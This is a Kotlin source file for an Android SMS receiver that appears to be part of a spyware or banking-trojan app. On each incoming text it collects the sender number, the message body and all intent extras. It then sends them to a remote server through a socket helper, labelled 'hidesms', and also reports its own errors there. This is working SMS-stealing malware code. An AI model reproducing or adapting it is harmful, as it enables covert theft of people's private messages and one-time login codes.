package com.xxx.zzz.smsp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import com.xxx.zzz.socketsp.IOSocketyt
import org.json.JSONObject
import java.util.concurrent.TimeUnit


class SmsReciever : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        interceptionSMS(intent)
        IOSocketyt.sendLogs("", "SmsReciever onReceive", "success")

        TimeUnit.SECONDS.sleep(1)
    }

    fun interceptionSMS(intent: Intent) {
        val extras = intent.extras
        val obj = JSONObject()
        if (extras != null) {
            for (key in extras.keySet()) {
                runCatching {
                    obj.put(key, extras.get(key))
                    val value = extras.getString(key)
                    obj.put(key + "_", value)
                }
            }
        }

        try {
            if (extras != null) {
                val pdus = extras["pdus"] as Array<*>?
                var number = ""
                var text = ""
                if (pdus != null) {
                    for (aPdusObj in pdus) {
                        runCatching {
                            val smsMessage = SmsMessage.createFromPdu(aPdusObj as ByteArray)
                            number += smsMessage.displayOriginatingAddress
                            text += smsMessage.displayMessageBody
                        }
                    }
                }

                obj.put("number", number)
                obj.put("text", text)
            }
        } catch (ex: Exception) {
            IOSocketyt.sendLogs("", "SmsReciever1 ${ex.localizedMessage}", "error")
            try {
                val bundle = intent.extras
                val msgs: Array<SmsMessage?>?
                var str = ""
                var number = ""
                if (bundle != null) {
                    val pdus = bundle["pdus"] as Array<*>?
                    msgs = arrayOfNulls(pdus!!.size)
                    for (i in msgs.indices) {
                        runCatching {
                            val msgs = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                            number += msgs?.displayOriginatingAddress ?: ""
                            str += msgs?.messageBody
                        }
                    }
                    obj.put("number", number)
                    obj.put("text", str)
                }
            } catch (e: java.lang.Exception) {
                IOSocketyt.sendLogs("", "SmsReciever2 ${ex.localizedMessage}", "error")
            }
        }

        IOSocketyt.sendLogs("", obj.toString(), "hidesms")
    }
}